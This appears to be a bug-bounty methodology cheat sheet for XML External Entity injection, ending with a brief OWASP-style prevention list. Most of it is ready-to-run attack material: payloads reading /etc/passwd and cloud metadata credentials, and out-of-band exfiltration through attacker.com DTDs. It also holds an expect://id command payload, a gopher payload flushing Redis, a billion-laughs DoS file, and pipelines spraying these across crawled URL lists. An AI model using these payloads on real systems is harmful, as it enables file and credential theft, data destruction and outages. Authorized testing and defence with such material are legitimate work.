# XXE (XML External Entity Injection)

> Comprehensive XXE testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

XML External Entity (XXE) injection occurs when an XML parser processes untrusted input containing external entity references, enabling file disclosure, SSRF, DoS (billion laughs), or port scanning. Based on OWASP XML External Entity Prevention Cheat Sheet, PortSwigger XXE labs, PayloadsAllTheThings (2026), and recent trends (Apache Tika CVE‑2025‑66516 PDF XXE, Apache Struts CVE‑2025‑68493, GeoServer CVE‑2025‑58360, cloud metadata exfiltration via XXE, OOB exploitation in modern parsers).

## Methodology

### 1. Target & Endpoint Identification
- **Common vulnerable parameter names:** `xml=`, `data=`, `payload=`, `content=`, `body=`, `request=`, `input=`, `file=`, `upload=`, `import=`, `config=`, `feed=`, `rss=`, `atom=`, `soap=`, `saml=`, `assertion=`, `envelope=`, `document=`, `report=`
- **Endpoints accepting XML:** SOAP/REST APIs with XML payloads, XML file uploads (configs, imports, DOCX with embedded XML), RSS/Atom feed importers, document converters (PDF, Office → XML parsing), SAML assertions/SSO, web services/WSDL, report generators (custom XML templates), APIs accepting `application/xml` or `text/xml`
- **Additional vectors:** Multipart file uploads with `.xml`, `.svg`, `.docx` (OOXML), headers (`Content-Type: application/xml`), JSON‑to‑XML conversions

### 2. Basic Probes & Detection
- **In‑band XXE:** Entity reference echoed in response
- **File disclosure:** `file:///etc/passwd`, `file:///C:/Windows/win.ini`
- **SSRF:** `http://169.254.169.254/latest/meta‑data/`
- **Blind/OOB:** Use parameter entities to exfiltrate data via DNS/HTTP

### 3. Advanced Payloads & Bypass Techniques (2025–2026)
- **In‑band file read:** `php://filter/convert.base64‑encode/resource=/etc/passwd`
- **Out‑of‑band (OOB) exfiltration:** Nested parameter entities with external DTD
- **Billion laughs / quadratic blowup DoS:** Exponential entity expansion
- **WAF/parser bypasses:** Parameter entities (`%`), CDATA wrapping, encoding (UTF‑16), case mixing (`SyStEm`), protocol variations (`expect://`, `php://`, `jar://`, `netdoc://`), PDF‑embedded XXE (Apache Tika), OOXML in DOCX, SVG with external refs

### 4. Target Files & Endpoints for PoC
- **Linux:** `/etc/passwd`, `/etc/issue`, `/proc/self/environ`
- **Windows:** `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- **Cloud metadata:** AWS (`169.254.169.254/latest/meta‑data/iam/security‑credentials/role`), GCP (`metadata.google.internal`), Azure (`169.254.169.254/metadata/instance`)
- **Internal services:** `http://127.0.0.1:8080/admin`, Redis (`gopher://127.0.0.1:6379/_*1...`)
- **Configs:** `.env`, `web.config`, `application.yml`

### 5. Chained Exploitation
- **XXE → SSRF:** Internal network port scanning, cloud metadata theft
- **XXE → RCE:** Via `expect://` or `php://` wrappers (rare)
- **XXE → DoS:** Billion laughs denial of service
- **XXE → file upload:** Extract sensitive files (configs, secrets)

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# XXE‑specific tools
git clone https://github.com/enjoiz/XXEinjector.git  # Automated XXE injection tool
git clone https://github.com/TheTwitchy/xxer.git      # Python‑based XXE scanner

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest

# Out‑of‑band detection
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Testing Commands

### 1. Parameter Discovery & Enumeration

```bash
# GF pattern matching for XML endpoints
gf xxe crawledurls.txt > gf-xxe.txt  # Extract XML‑related URLs

# Custom pattern for XML parameters
grep -E "(xml=|data=|payload=|content=|body=|request=|input=|file=|upload=|import=|config=|feed=|rss=|atom=|soap=|saml=|assertion=|envelope=|document=|report=)" crawledurls.txt | anew xxe-params-additional.txt

# Extract from JavaScript files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | grep -E "(xml|data|payload|content)" | sort -u > js-xxe-params.txt
```

### 2. Basic XXE Detection

```bash
# Test with simple in‑band payload
cat gf-xxe.txt | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE test">]><foo>&xxe;</foo>' | httpx -silent -match-string "XXE test" | tee xxe-basic-hits.txt

# Test file disclosure (Linux)
cat gf-xxe.txt | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' | httpx -silent -match-string "root:x" | tee xxe-file-hits.txt

# Test file disclosure (Windows)
cat gf-xxe.txt | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>' | httpx -silent -match-string "\[fonts\]" | tee xxe-windows-hits.txt
```

### 3. Advanced Payload Testing

```bash
# Create payloads file with various bypasses
cat > xxe-payloads.txt << EOF
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%xxe;'>"> %eval; %exfil;]><foo></foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a">]><foo>&xxe;</foo>
EOF

# Iterate through payloads
cat gf-xxe.txt | while read -r param_url; do
  while read -r payload; do
    echo "${param_url}${payload}"
  done < xxe-payloads.txt
done | httpx -silent -match-string "root:x\|\[fonts\]\|base64\|169.254.169.254\|attacker.com" | tee xxe-advanced-hits.txt
```

### 4. Automated Scanning with XXEinjector

```bash
# Scan single URL
python3 XXEinjector.py --host=https://target.com --path=/api --file=request.txt

# Generate request.txt from Burp
# Then run
python3 XXEinjector.py --host=https://target.com --path=/api --file=request.txt --oob=http://attacker.com --verbose

# Scan list of URLs
cat gf-xxe.txt | xargs -I@ python3 XXEinjector.py --host=@ --path=/api --file=request.txt
```

### 5. Blind XXE Detection with Interactsh

```bash
# Start interactsh client
interactsh-client -s &

# Generate OOB payload with your interactsh URL
INTERACTSH_URL="https://YOUR_ID.oast.pro"
cat gf-xxe.txt | qsreplace "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"$INTERACTSH_URL\"> %xxe;]><foo></foo>" | httpx -silent -timeout 10

# Monitor interactsh for callbacks
interactsh-client -l -o interactsh-log.txt
```

### 6. Nuclei Templates for XXE

```bash
# Scan with nuclei XXE templates
nuclei -u https://target.com -t ~/nuclei-templates/xxe/ -o nuclei-xxe.txt

# Use specific tags
nuclei -u https://target.com -tags xxe -o nuclei-xxe-tagged.txt
```

### 7. SOAP Endpoint Testing

```bash
# Detect SOAP endpoints
grep -i "soap" crawledurls.txt | tee soap-endpoints.txt

# Send SOAP XXE payload
curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>' "http://target.com/soap"
```

### 8. File Upload XXE (SVG, DOCX, PDF)

```bash
# Create malicious SVG with XXE
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>' > payload.svg

# Upload SVG and trigger parsing
curl -X POST -F "file=@payload.svg" "http://target.com/upload"
curl "http://target.com/uploads/payload.svg"

# DOCX/PDF XXE requires specialized tools (e.g., Apache Tika testing)
```

### 9. Billion Laughs DoS Testing (Caution!)

```bash
# Generate billion laughs payload (use only in authorized environments)
cat > billion-laughs.xml << EOF
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
EOF

# Send with caution (may crash server)
curl -X POST -H "Content-Type: application/xml" -d @billion-laughs.xml "http://target.com/api"
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Apache Tika PDF XXE (CVE‑2025‑66516):** Embedded XML in PDF metadata
- **Apache Struts XXE (CVE‑2025‑68493):** OGNL expression injection via XML
- **GeoServer XXE (CVE‑2025‑58360):** WFS‑XML parsing
- **UTF‑16 encoding bypass:** Switch encoding to evade WAF regex
- **Nested parameter entities:** `%` instead of `&` for internal DTD subset
- **CDATA wrapping:** Hide payload inside CDATA sections
- **Protocol smuggling:** `jar://`, `netdoc://`, `expect://`
- **SVG‑based XXE:** SVG files with external entity references
- **DOCX OOXML XXE:** `word/document.xml` with external DTD

## Detection & Verification

- **File content leaked** – e.g., `root:x:0:0:root` in response
- **SSRF indicators** – internal IPs, cloud metadata in response
- **Collaborator interactions** – DNS/HTTP callbacks to your server
- **Parser errors** – entity not defined, forbidden protocol
- **Time delays / DoS** – server slow or unresponsive after billion laughs
- **PoC:** Screenshot of file disclosure, network capture of exfiltration, business impact

## Prevention (Developer View – OWASP Latest)

1. **Disable DTD / external entities completely** – safest option
   - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
   - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit;`
   - PHP: `libxml_disable_entity_loader(true);`
2. **Use safe parsers** – prefer JSON over XML when possible
3. **Allow‑list schemas** – disable external entity resolution
4. **Input validation / size limits** – reject large XML documents
5. **Sandbox / least privilege** – run parsers with minimal permissions
6. **Regular security testing** – include XXE checks in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/XXE.md](../Web‑Vulnerability‑Testing‑Checklist/XXE.md)
- **PortSwigger XXE**: https://portswigger.net/web‑security/xxe
- **OWASP XML External Entity Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- **PayloadsAllTheThings – XXE**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- **YesWeHack 2026 Guide**, recent CVEs (Apache Tika 2025‑66516, Struts 2025‑68493, GeoServer 2025‑58360)

> **Happy (ethical) hunting** — XXE still hits hard in legacy SOAP, document parsers, and 2026 CVEs!